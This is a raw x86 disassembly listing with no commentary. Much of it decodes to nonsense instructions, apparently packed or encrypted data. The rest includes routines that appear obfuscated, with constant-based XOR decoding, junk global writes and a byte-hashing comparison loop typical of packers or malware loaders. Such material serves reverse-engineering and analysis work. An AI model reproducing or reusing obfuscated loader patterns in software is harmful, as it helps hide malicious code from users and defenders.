  41a85f:	jbe    0x41a7e7
  41a861:	sbb    eax,0xacfc7b85
  41a866:	xor    eax,0x4a04db50
  41a86b:	add    ebp,DWORD PTR ds:[eax]
  41a86e:	add    BYTE PTR [esi],ah
  41a870:	add    BYTE PTR [esi-0x6496da23],0x2c
  41a877:	pop    ebp
  41a878:	sub    eax,0x45fe41fa
  41a87d:	adc    al,0xb9
  41a87f:	aaa    
  41a880:	mov    es:0x1ad116e,al
  41a886:	call   0x30e9f6ea
  41a88b:	shl    BYTE PTR [ecx],0x37
  41a88e:	(bad)  
  41a88f:	and    BYTE PTR [esi+0x5836c17b],ch
  41a895:	rcr    DWORD PTR [ebp+0x61abd63d],0xed
  41a89c:	cmc    
  41a89d:	dec    ebx
  41a89e:	cdq    
  41a89f:	cmp    BYTE PTR [edx],ch
  41a8a1:	popf   
  41a8a2:	out    dx,al
  41a8a3:	int    0xa5
  41a8a5:	cld    
  41a8a6:	push   eax
  41a8a7:	cmp    DWORD PTR [ebx],ebx
  41a8a9:	adc    BYTE PTR [ebp+0x5b678dc7],0xe6
  41a8b0:	xor    esp,esi
  41a8b2:	push   edx
  41a8b3:	or     bh,BYTE PTR [ecx-0x75]
  41a8b6:	mov    BYTE PTR [eax+0x47b54946],dh
  41a8bc:	mov    esp,DWORD PTR [ebp+0x1d]
  41a8bf:	mov    DWORD PTR [eax],esi
  41a8c1:	dec    ebp
  41a8c2:	jecxz  0x41a84f
  41a8c4:	and    ebp,ebp
  41a8c6:	or     eax,DWORD PTR [ecx-0x29]
  41a8c9:	dec    edi
  41a8ca:	mov    dl,0x8c
  41a8cc:	pop    ds
  41a8cd:	mov    eax,DWORD PTR [eax-0x708baa22]
  41a8d3:	xor    edx,DWORD PTR gs:[ecx+edx*4]
  41a8d7:	popa   
  41a8d8:	(bad)  
  41a8da:	icebp  
  41a8db:	pusha  
  41a8dc:	cmp    ecx,DWORD PTR [ebx-0x70]
  41a8df:	sub    ebp,edi
  41a8e1:	sbb    BYTE PTR [edx],cl
  41a8e3:	out    dx,al
  41a8e4:	fmul   DWORD PTR [esi+0x58dd1080]
  41a8ea:	add    edx,esi
  41a8ec:	xchg   edx,eax
  41a8ed:	aaa    
  41a8ee:	arpl   WORD PTR [esi-0x15],di
  41a8f1:	(bad)  
  41a8f2:	sbb    al,0x7
  41a8f4:	sahf   
  41a8f5:	sub    DWORD PTR [esi+0x45df4e36],esi
  41a8fb:	loope  0x41a889
  41a8fd:	cdq    
  41a8fe:	stc    
  41a8ff:	pop    esi
  41a900:	lods   al,BYTE PTR ds:[esi]
  41a901:	out    dx,eax
  41a902:	and    DWORD PTR [ebx-0x3d],ebx
  41a905:	enter  0x61a,0xc
  41a909:	test   BYTE PTR [ebp+0x2d],0xc3
  41a90d:	mov    esp,0xe2488733
  41a912:	out    0xdb,al
  41a914:	aaa    
  41a915:	inc    eax
  41a916:	lea    edi,[ecx-0x308e4d5f]
  41a91c:	cmp    ch,BYTE PTR [eax]
  41a91e:	xor    al,bh
  41a920:	lds    ecx,FWORD PTR [esi+0x3e6d5e2e]
  41a926:	mov    bl,0xb3
  41a928:	out    0x90,eax
  41a92a:	and    DWORD PTR [ecx-0x40dadb82],0x72
  41a931:	or     al,al
  41a933:	int    0x37
  41a935:	jmp    0xa96:0x5f70c5ca
  41a93c:	(bad)  
  41a93d:	jmp    0x41a934
  41a93f:	push   ecx
  41a940:	packsswb mm5,QWORD PTR ds:0xb0467d88
  41a947:	and    al,0x2a
  41a949:	in     al,dx
  41a94a:	(bad)  
  41a94b:	ins    BYTE PTR es:[edi],dx
  41a94c:	sub    al,0xc4
  41a94e:	mov    esp,0x3f1cffe9
  41a953:	push   esi
  41a954:	cdq    
  41a955:	idiv   BYTE PTR [eax+0x3]
  41a958:	dec    esi
  41a959:	inc    edi
  41a95a:	rol    DWORD PTR [edi],0x8f
  41a95d:	cmp    edx,ebp
  41a95f:	dec    eax
  41a960:	js     0x41a928
  41a962:	push   ebp
  41a963:	ret    0x158c
  41a966:	shl    esp,0x2d
  41a969:	call   0x83d7:0xc2c7cffc
  41a970:	cmp    BYTE PTR [ebp+0x56],bh
  41a973:	jo     0x41a93d
  41a975:	pop    DWORD PTR [eax-0x77]
  41a978:	xor    eax,0xaae8911f
  41a97d:	mov    ah,0x1e
  41a97f:	sub    eax,0x462c194e
  41a984:	ret    0x1dee
  41a987:	outs   dx,DWORD PTR ds:[esi]
  41a988:	popa   
  41a989:	pop    ds
  41a98a:	mov    ah,0x37
  41a98c:	adc    eax,DWORD PTR [eax]
  41a98e:	pop    esp
  41a98f:	cmp    esi,DWORD PTR [ecx]
  41a991:	hlt    
  41a992:	jge    0x41a9a0
  41a994:	jge    0x41a916
  41a996:	xor    dl,ah
  41a998:	add    al,0xf7
  41a99a:	leave  
  41a99b:	fucomi st,st(0)
  41a99d:	(bad)  
  41a99e:	adc    BYTE PTR [ebx+edx*1-0x30],al
  41a9a2:	push   ecx
  41a9a3:	sub    BYTE PTR [ecx],0x42
  41a9a6:	mov    bl,0x67
  41a9a8:	aas    
  41a9a9:	jle    0x41a9a7
  41a9ab:	mov    edx,0xe3caeed6
  41a9b0:	dec    ebx
  41a9b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9b2:	daa    
  41a9b3:	mov    DWORD PTR [ecx-0x2f],edx
  41a9b6:	jns    0x41aa05
  41a9b8:	pop    esp
  41a9b9:	mov    bh,0xd5
  41a9bb:	out    0xd3,al
  41a9bd:	into   
  41a9be:	or     DWORD PTR [eax+0x1b87bc26],0x5a
  41a9c5:	jl     0x41a955
  41a9c7:	int3   
  41a9c8:	cmp    eax,0xdea7ef7c
  41a9cd:	add    eax,0x88a47bdd
  41a9d2:	sar    DWORD PTR [eax],cl
  41a9d4:	mov    ds:0x62f3325b,eax
  41a9d9:	sbb    esp,DWORD PTR [ecx+0xf]
  41a9dc:	repnz mov es,WORD PTR cs:[edx+esi*1+0x5c9f11e1]
  41a9e5:	mov    al,0xe5
  41a9e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a9e8:	pop    ebx
  41a9e9:	hlt    
  41a9ea:	vshufps ymm2,ymm2,YMMWORD PTR [ebx-0x63],0x7e
  41a9f0:	rcr    BYTE PTR cs:[ecx+esi*2-0x4885f1d7],0xb4
  41a9f9:	int3   
  41a9fa:	popf   
  41a9fb:	pop    esp
  41a9fc:	in     eax,0xd0
  41a9fe:	fstp   QWORD PTR [ecx]
  41aa00:	fmul   DWORD PTR [eax+0x11]
  41aa03:	outs   dx,BYTE PTR ds:[esi]
  41aa04:	mov    ds:0x60d6396d,al
  41aa09:	push   ecx
  41aa0a:	inc    ebx
  41aa0b:	pop    esp
  41aa0c:	mov    DWORD PTR [edx+0x63bb1993],0xfe1f984e
  41aa16:	bound  edx,QWORD PTR [edx-0x543c2f8a]
  41aa1c:	repz or eax,0x5ef1e95d
  41aa22:	sbb    DWORD PTR [ebx-0x5666d6d7],esi
  41aa28:	adc    eax,0xd3e93ba
  41aa2d:	out    0xaf,eax
  41aa2f:	mov    ebp,0xd560bcd4
  41aa34:	mov    eax,0x3200087a
  41aa39:	test   al,0xc6
  41aa3b:	ins    BYTE PTR es:[edi],dx
  41aa3c:	lahf   
  41aa3d:	add    al,0x26
  41aa3f:	inc    esp
  41aa40:	mov    edi,0x8cfa1a76
  41aa45:	ja     0x41aa13
  41aa47:	and    dh,BYTE PTR [ecx+0x3d9b6d60]
  41aa4d:	xor    al,0x1b
  41aa4f:	inc    esp
  41aa50:	cmp    DWORD PTR [ebx+0x479a492b],edx
  41aa56:	adc    BYTE PTR ds:[edi+0x74c3b16e],cl
  41aa5d:	sbb    al,BYTE PTR [ebx]
  41aa5f:	push   0x3652bc70
  41aa64:	test   BYTE PTR [esi],bh
  41aa66:	nop
  41aa67:	imul   BYTE PTR [esi]
  41aa69:	iret   
  41aa6a:	not    BYTE PTR [esi+edi*2+0x44ac9c1d]
  41aa71:	aam    0x71
  41aa73:	sub    edi,DWORD PTR [ebx]
  41aa75:	(bad)  
  41aa76:	int    0xf0
  41aa78:	out    0x5c,eax
  41aa7a:	adc    dh,BYTE PTR cs:[edi+0x43]
  41aa7e:	loop   0x41aa58
  41aa80:	sbb    esp,DWORD PTR [esi-0xcdefbef]
  41aa86:	loop   0x41aadf
  41aa88:	push   ds
  41aa89:	dec    esi
  41aa8a:	xchg   BYTE PTR ds:0xed46f75b,bh
  41aa90:	xor    ecx,0x3be800d6
  41aa96:	je     0x41aa57
  41aa98:	xchg   DWORD PTR gs:[ebp+0x1cabb705],esi
  41aa9f:	mov    al,0x7e
  41aaa1:	pop    edi
  41aaa2:	(bad)  
  41aaa3:	aam    0x60
  41aaa5:	push   esi
  41aaa6:	pop    ds
  41aaa7:	cld    
  41aaa8:	mul    DWORD PTR [ecx+0x58]
  41aaab:	mov    dl,0x16
  41aaad:	ins    BYTE PTR es:[edi],dx
  41aaae:	or     al,0xe1
  41aab0:	repnz sahf 
  41aab2:	fld    DWORD PTR [ebx+edi*4]
  41aab5:	mov    al,ds:0x8536e4f8
  41aaba:	int    0xc6
  41aabc:	shr    dh,1
  41aabe:	shr    BYTE PTR [ebx+0x18d6be85],0x3c
  41aac5:	inc    edi
  41aac6:	cs gs (bad) 
  41aaca:	pop    ss
  41aacb:	arpl   WORD PTR [eax+eax*4+0x32cafea2],dx
  41aad2:	xchg   esi,eax
  41aad3:	jge    0x41aa6e
  41aad5:	data16 jnp 0x41ab47
  41aad8:	loopne 0x41aa60
  41aada:	test   BYTE PTR ds:0xa4bcb4c0,bh
  41aae0:	lods   al,BYTE PTR ds:[esi]
  41aae1:	push   esp
  41aae2:	and    al,0x1d
  41aae4:	test   al,0x4
  41aae6:	sbb    BYTE PTR [eax],bl
  41aae8:	xor    BYTE PTR [edx],bl
  41aaea:	and    bl,BYTE PTR [edx]
  41aaec:	ins    DWORD PTR es:[edi],dx
  41aaed:	bound  ebx,QWORD PTR [ebx-0x6c]
  41aaf0:	cs stos DWORD PTR es:[edi],eax
  41aaf2:	jne    0x41ab45
  41aaf4:	mov    edi,0x73f8b56b
  41aaf9:	xchg   ecx,eax
  41aafa:	clc    
  41aafb:	jb     0x41aaf1
  41aafd:	js     0x41aac4
  41aaff:	sbb    eax,0xb02fb010
  41ab04:	sbb    al,0x6a
  41ab06:	jecxz  0x41ab61
  41ab08:	and    bh,bl
  41ab0a:	add    DWORD PTR [eax],eax
  41ab0c:	mov    ebx,0xbe694f4e
  41ab11:	scas   al,BYTE PTR es:[edi]
  41ab12:	retf   
  41ab13:	cmp    al,BYTE PTR [edi-0x4e5febe3]
  41ab19:	or     BYTE PTR [ebx],ch
  41ab1b:	pcmpeqb mm4,mm1
  41ab1e:	leave  
  41ab1f:	fisub  WORD PTR [esi]
  41ab21:	mov    edx,0x9eb60bc3
  41ab26:	dec    ebx
  41ab27:	inc    ebx
  41ab28:	lock sub ebx,edx
  41ab2b:	xchg   BYTE PTR [esi+0x7b],ch
  41ab2e:	or     al,0xa1
  41ab30:	out    dx,al
  41ab31:	out    dx,eax
  41ab32:	mov    dl,0x76
  41ab34:	les    esi,FWORD PTR [ebx-0x6b]
  41ab37:	jl     0x41aade
  41ab39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab3a:	xchg   ecx,eax
  41ab3b:	push   es
  41ab3c:	fist   DWORD PTR [edi]
  41ab3e:	fldenv [esi-0x46]
  41ab41:	inc    ecx
  41ab42:	cdq    
  41ab43:	cmp    BYTE PTR [edx+0x2a57da44],0xbd
  41ab4a:	sbb    al,0x52
  41ab4c:	dec    esp
  41ab4d:	repz pop ebp
  41ab4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab50:	es mov edi,0x47c544db
  41ab56:	dec    edx
  41ab57:	adc    edx,DWORD PTR [esi-0x3af52532]
  41ab5d:	sub    eax,0xb9906189
  41ab62:	add    eax,0x760fbb1d
  41ab67:	dec    ecx
  41ab68:	and    DWORD PTR [esi-0x10],ebx
  41ab6b:	mov    edi,0x1da6f77
  41ab70:	lahf   
  41ab71:	pop    edi
  41ab72:	pop    esp
  41ab74:	ret    0xcd78
  41ab77:	lods   al,BYTE PTR ds:[esi]
  41ab78:	push   es
  41ab79:	ja     0x41ab9c
  41ab7b:	ins    BYTE PTR es:[edi],dx
  41ab7c:	mov    ebp,0xaaf4b21b
  41ab81:	(bad)  
  41ab82:	loop   0x41ab84
  41ab84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab85:	rcl    dh,cl
  41ab87:	push   ebp
  41ab88:	rcl    ebp,0x48
  41ab8b:	adc    cl,BYTE PTR [edx-0x3c]
  41ab8e:	nop
  41ab8f:	in     eax,dx
  41ab90:	push   es
  41ab91:	mov    ds:0xd076ddb0,eax
  41ab96:	mov    cl,0x1f
  41ab98:	pop    es
  41ab99:	retf   
  41ab9a:	ror    DWORD PTR [edx],cl
  41ab9c:	jmp    0x41abf2
  41ab9e:	xchg   DWORD PTR [ebp+0x1552198],edi
  41aba4:	jge    0x41ac0b
  41aba6:	ins    BYTE PTR es:[edi],dx
  41aba7:	dec    edx
  41aba8:	test   BYTE PTR [esi-0x513d6677],bh
  41abae:	pop    esp
  41abaf:	test   ch,ch
  41abb1:	or     BYTE PTR [ebp+0x6],0x3e
  41abb5:	xor    dl,BYTE PTR [eax]
  41abb7:	mov    dh,BYTE PTR [ebx-0x3f]
  41abba:	ja     0x41ab92
  41abbc:	mov    eax,0xda1eb66f
  41abc1:	mov    ebp,0x14363ea9
  41abc6:	mov    ecx,0x82abbf45
  41abcb:	shr    BYTE PTR [edi+ecx*8],1
  41abce:	adc    eax,0xbc5f4ed5
  41abd3:	cmp    al,0x3f
  41abd5:	sub    ebx,DWORD PTR [ecx+0x9c917db]
  41abdb:	sahf   
  41abdc:	imul   DWORD PTR [ebp+0x67]
  41abdf:	dec    ebp
  41abe0:	inc    ecx
  41abe1:	leave  
  41abe2:	pop    ebp
  41abe3:	jle    0x41abaf
  41abe5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41abe6:	loopne 0x41ab79
  41abe8:	mov    dl,0x90
  41abea:	mov    eax,ds:0x5641c187
  41abef:	pop    ebx
  41abf0:	xchg   esp,eax
  41abf1:	loop   0x41abfb
  41abf3:	das    
  41abf4:	fdiv   st,st(5)
  41abf6:	xchg   ebx,eax
  41abf7:	mov    eax,0xa53b12c2
  41abfc:	sar    al,1
  41abfe:	gs out 0x41,eax
  41ac01:	xor    BYTE PTR [edx-0x334be5d7],0x3c
  41ac08:	sahf   
  41ac09:	push   ebx
  41ac0a:	fwait
  41ac0b:	in     al,0x4e
  41ac0d:	adc    eax,0x2d4dfffc
  41ac12:	dec    ecx
  41ac13:	dec    eax
  41ac14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac15:	inc    eax
  41ac16:	jmp    FWORD PTR [ecx-0x48]
  41ac19:	loop   0x41ac41
  41ac1b:	pop    edi
  41ac1c:	adc    ch,BYTE PTR [esi-0x50]
  41ac1f:	sbb    al,0x52
  41ac21:	fwait
  41ac22:	hlt    
  41ac23:	mov    WORD PTR [ecx+0x1c],?
  41ac26:	xchg   edx,eax
  41ac27:	inc    ebp
  41ac28:	enter  0xcede,0x16
  41ac2c:	mov    dl,0x53
  41ac2e:	push   cs
  41ac2f:	mov    ch,BYTE PTR [edx+0x64a4249c]
  41ac35:	scas   eax,DWORD PTR es:[edi]
  41ac36:	push   ebp
  41ac37:	inc    eax
  41ac39:	adc    BYTE PTR ds:0x193d7d36,bl
  41ac3f:	push   0x79
  41ac41:	xchg   esi,eax
  41ac42:	mov    cl,0x84
  41ac44:	loopne 0x41abcd
  41ac46:	sub    al,0x10
  41ac48:	push   cs
  41ac49:	test   dh,ah
  41ac4b:	adc    dl,BYTE PTR [edi+0x6c]
  41ac4e:	pop    ecx
  41ac4f:	outs   dx,BYTE PTR ds:[esi]
  41ac50:	push   0xffffffcf
  41ac52:	sub    BYTE PTR [edi+0x15],ch
  41ac55:	xor    bh,BYTE PTR ds:0x938daa2a
  41ac5b:	mov    eax,ds:0x297d7406
  41ac60:	and    DWORD PTR [eax-0x24c9b035],0xffffffe7
  41ac67:	aad    0x19
  41ac69:	mov    edx,0x166c9f4
  41ac6e:	dec    BYTE PTR [edx+eax*4+0x6a3c6bde]
  41ac75:	iret   
  41ac76:	mov    dl,0x45
  41ac78:	ret    
  41ac79:	or     BYTE PTR [edi+0x0],bl
  41ac7c:	cmp    al,0x5f
  41ac7e:	int    0xe0
  41ac80:	cmp    edx,DWORD PTR [eax-0x61]
  41ac83:	dec    ecx
  41ac84:	push   edx
  41ac85:	leave  
  41ac86:	mov    edi,0x91166d8c
  41ac8b:	ret    
  41ac8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac8d:	cmc    
  41ac8e:	pop    ecx
  41ac8f:	sti    
  41ac90:	loopne 0x41acd3
  41ac92:	push   ebp
  41ac93:	daa    
  41ac94:	mov    bh,0xf5
  41ac96:	inc    ecx
  41ac97:	jb     0x41ac1f
  41ac99:	outs   dx,DWORD PTR ds:[esi]
  41ac9a:	das    
  41ac9b:	pusha  
  41ac9c:	pop    esi
  41ac9d:	stos   DWORD PTR es:[edi],eax
  41ac9e:	sahf   
  41ac9f:	dec    edi
  41aca0:	xchg   edx,eax
  41aca1:	inc    edx
  41aca2:	cmp    ecx,DWORD PTR [esi+0x7a]
  41aca5:	jno    0x41ad04
  41aca7:	in     eax,0xd9
  41aca9:	and    ch,BYTE PTR [edx+0x3a]
  41acac:	fwait
  41acad:	xchg   edi,eax
  41acae:	sbb    dl,ch
  41acb0:	icebp  
  41acb1:	jnp    0x41ac89
  41acb3:	dec    esi
  41acb4:	sbb    BYTE PTR [edx+0x601267bf],al
  41acba:	pop    esp
  41acbb:	pop    edx
  41acbc:	cmp    eax,0xd66f55b
  41acc1:	push   edi
  41acc2:	or     edx,0xa85499ce
  41acc8:	xor    eax,0xccb76064
  41accd:	push   ebx
  41acce:	mov    eax,0x3e86c7e0
  41acd3:	stos   BYTE PTR es:[edi],al
  41acd4:	add    cl,BYTE PTR [ebx]
  41acd6:	dec    edx
  41acd7:	call   FWORD PTR ds:0x6b9f3747
  41acdd:	push   ss
  41acde:	push   edx
  41acdf:	in     al,dx
  41ace0:	push   cs
  41ace1:	sar    BYTE PTR [ecx],0x7c
  41ace4:	ins    BYTE PTR es:[edi],dx
  41ace5:	xchg   ecx,eax
  41ace6:	mov    al,ds:0x93cb19d7
  41aceb:	mov    edx,0x4c94843d
  41acf0:	add    DWORD PTR [ebx],esp
  41acf2:	cmp    bl,dl
  41acf4:	cs enter 0x9121,0x1f
  41acf9:	lea    ecx,[ebx]
  41acfb:	in     eax,dx
  41acfc:	adc    DWORD PTR [edi+edx*1-0x5e84f651],0xe0ca9af4
  41ad07:	cdq    
  41ad08:	jecxz  0x41ad1f
  41ad0a:	inc    esi
  41ad0b:	dec    ebp
  41ad0c:	and    esi,eax
  41ad0e:	cli    
  41ad0f:	inc    BYTE PTR [ecx-0x60]
  41ad12:	fimul  WORD PTR [edi]
  41ad14:	mov    edi,0xd061b2c
  41ad19:	int3   
  41ad1a:	mov    ss,WORD PTR [esi]
  41ad1c:	ins    DWORD PTR es:[edi],dx
  41ad1d:	mov    al,0xda
  41ad1f:	leave  
  41ad20:	test   ebp,ebp
  41ad22:	lods   al,BYTE PTR ds:[esi]
  41ad23:	stos   BYTE PTR es:[edi],al
  41ad24:	jge    0x41accc
  41ad26:	cmp    esi,edx
  41ad28:	jg     0xfbba6d2d
  41ad2e:	mov    esp,0x979a7dbd
  41ad33:	cdq    
  41ad34:	sub    ah,BYTE PTR [edi+0x1b]
  41ad37:	cmp    al,0x12
  41ad39:	enter  0xc8ff,0xd
  41ad3d:	add    al,0x23
  41ad3f:	jbe    0x41ad78
  41ad41:	push   ds
  41ad42:	pop    ds
  41ad43:	inc    ecx
  41ad44:	jg     0x41ad23
  41ad46:	hlt    
  41ad47:	lea    edi,[ecx]
  41ad49:	jne    0x41adbf
  41ad4b:	int    0xd1
  41ad4d:	cld    
  41ad4e:	out    dx,eax
  41ad4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad50:	jle    0x41ad2d
  41ad52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad53:	or     al,0x50
  41ad55:	mov    esi,0xdbe77eb3
  41ad5a:	xor    al,0x34
  41ad5c:	retf   
  41ad5d:	jg     0x41ad66
  41ad5f:	inc    eax
  41ad60:	or     DWORD PTR [edi-0x52],esp
  41ad63:	add    edi,DWORD PTR [ebx+0x12]
  41ad66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad67:	add    ebx,edi
  41ad69:	xor    ecx,edi
  41ad6b:	lds    ebp,FWORD PTR [ebp+0x7c76d1d0]
  41ad71:	push   edx
  41ad72:	icebp  
  41ad73:	dec    eax
  41ad74:	pop    es
  41ad75:	aad    0x7c
  41ad77:	pop    edi
  41ad78:	xchg   edi,eax
  41ad79:	jle    0x41adc5
  41ad7b:	int    0xb7
  41ad7d:	das    
  41ad7e:	inc    esi
  41ad7f:	das    
  41ad80:	daa    
  41ad81:	mov    dl,0x9a
  41ad83:	daa    
  41ad84:	into   
  41ad85:	xor    BYTE PTR [edx],al
  41ad87:	xchg   BYTE PTR [edi],bl
  41ad89:	jae    0x3375c717
  41ad8f:	iret   
  41ad90:	aaa    
  41ad91:	lods   eax,DWORD PTR ds:[esi]
  41ad92:	lods   al,BYTE PTR ds:[esi]
  41ad93:	test   DWORD PTR [ebx+0x68a48152],ebp
  41ad99:	mov    al,ds:0x2450f9c
  41ad9e:	stos   DWORD PTR es:[edi],eax
  41ad9f:	push   cs
  41ada0:	mov    ds:0x4486d508,al
  41ada5:	pop    es
  41ada6:	out    0x1d,eax
  41ada8:	lahf   
  41ada9:	mov    dh,0x38
  41adab:	mov    ah,0xca
  41adad:	pop    ebx
  41adae:	daa    
  41adaf:	aas    
  41adb0:	pop    esi
  41adb1:	hlt    
  41adb2:	inc    ebx
  41adb3:	or     eax,0x5b7e1f0a
  41adb8:	(bad)  
  41adb9:	std    
  41adba:	xor    DWORD PTR ds:0x25cf46bf,edx
  41adc0:	out    0x3f,al
  41adc2:	jno    0x41adf3
  41adc4:	adc    ch,BYTE PTR [eax-0x3ad272b]
  41adca:	pop    edi
  41adcb:	add    DWORD PTR [esi],eax
  41adcd:	cs fsubr st(5),st
  41add0:	adc    eax,eax
  41add2:	mov    edx,0x4007f975
  41add7:	stos   BYTE PTR es:[edi],al
  41add8:	jmp    0xe4d3c5b5
  41addd:	adc    BYTE PTR [esi-0x3153c70f],dh
  41ade3:	or     al,0x71
  41ade5:	jg     0x41ae24
  41ade7:	add    ch,cl
  41ade9:	pop    ds
  41adea:	push   0x73
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c16
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
  41aec0:	mov    esi,DWORD PTR [ebp+0x10]
  41aec3:	mov    edx,0x3272db
  41aec8:	add    eax,edx
  41aeca:	add    DWORD PTR ds:0x42b01c,0x428020
  41aed4:	mov    DWORD PTR [esi+0x4],eax
  41aed7:	mov    eax,DWORD PTR [ebp+0x14]
  41aeda:	mov    esi,DWORD PTR ds:0x428024
  41aee0:	sbb    esi,DWORD PTR ds:0x429010
  41aee6:	mov    DWORD PTR ds:0x428024,esi
  41aeec:	mov    esi,DWORD PTR [ebp+0x10]
  41aeef:	mov    DWORD PTR [esi+0x8],eax
  41aef2:	mov    eax,DWORD PTR [ebp+0x18]
  41aef5:	mov    esi,DWORD PTR [ebp+0x10]
  41aef8:	mov    DWORD PTR [esi+0xc],eax
  41aefb:	mov    eax,DWORD PTR [ebp+0x1c]
  41aefe:	mov    esi,DWORD PTR [ebp+0x10]
  41af01:	mov    DWORD PTR [esi+0x10],eax
  41af04:	mov    eax,DWORD PTR [ebp+0x8]
  41af07:	xor    eax,ecx
  41af09:	add    eax,edx
  41af0b:	pop    esi
  41af0c:	leave  
  41af0d:	ret    0x18
  41af10:	push   ebp
  41af11:	mov    ebp,esp
  41af13:	sub    esp,0x94
  41af19:	mov    eax,DWORD PTR [ebp+0x8]
  41af1c:	push   ebx
  41af1d:	neg    ecx
  41af1f:	push   esi
  41af20:	adc    esi,0x29b8
  41af26:	push   edi
  41af27:	or     edi,DWORD PTR ds:0x42b010
  41af2d:	mov    esi,0x7510893
  41af32:	or     ecx,ecx
  41af34:	xor    eax,esi
  41af36:	mov    edi,0x3272db
  41af3b:	add    eax,edi
  41af3d:	sub    DWORD PTR ds:0x42a018,0x772b
  41af47:	mov    DWORD PTR [ebp-0x38],eax
  41af4a:	mov    eax,ds:0x421a96
  41af4f:	mov    ecx,DWORD PTR ds:0x428008
  41af55:	and    DWORD PTR ds:0x42b004,ecx
  41af5b:	mov    eax,DWORD PTR [eax]
  41af5d:	mov    DWORD PTR ds:0x42a01c,0x19
  41af67:	cmp    DWORD PTR ds:0x42a01c,0x0
  41af6e:	je     0x41afbe
  41af74:	cmp    DWORD PTR ds:0x42a01c,0x4
  41af7b:	jne    0x41af92
  41af81:	push   0x506a
  41af86:	push   DWORD PTR [ebp-0x24]
  41af89:	push   DWORD PTR [ebp-0x14]
  41af8c:	call   DWORD PTR ds:0x424028
  41af92:	cmp    DWORD PTR ds:0x42a01c,0x5
  41af99:	jne    0x41afac
  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421c9e
  41afcc:	mov    ecx,DWORD PTR ds:0x421a0e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238d2
  41b017:	push   0x423852
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
